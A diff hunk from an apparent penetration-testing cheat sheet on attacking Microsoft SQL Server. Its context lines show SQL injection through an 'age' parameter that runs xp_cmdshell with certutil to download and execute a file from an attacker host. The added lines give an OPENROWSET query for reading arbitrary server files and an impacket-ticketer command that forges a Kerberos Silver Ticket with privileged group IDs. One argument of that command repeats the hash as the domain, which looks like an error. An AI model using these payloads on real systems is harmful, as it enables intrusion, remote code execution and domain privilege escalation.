@@ -299,6 +299,23 @@ http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://<
 http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\<FILE>.exe'; --
 ```
 
+### Read/Write using OPENROWSET
+
+> https://code-white.com/blog/2015-06-reading-and-writing-files-with-mssql-openrowset/
+
+```console
+SQL> SELECT * FROM OPENROWSET(BULK 'C:\PATH\TO\FILE\<FILE>', SINGLE_CLOB) AS x;
+```
+
+#### Forging Silver Ticket
+
+```console
+$ impacket-ticketer -nthash 89551acff8895768e489bb3054af94fd -domain-sid S-1-5-21-2847563149-1937258901-3562441728 -domain 89551acff8895768e489bb3054af94fd -spn MSSQLSVC/<RHOST> -groups 512,519,1105 -user-id 1103 mssqlsvc
+```
+
+* 1105 > SQL sysadmin 
+* 512/519 > Administer Bulk Operation
+
 ### Relative Identifier (RID) Transformation and User Enumeration
 
 #### Transformation
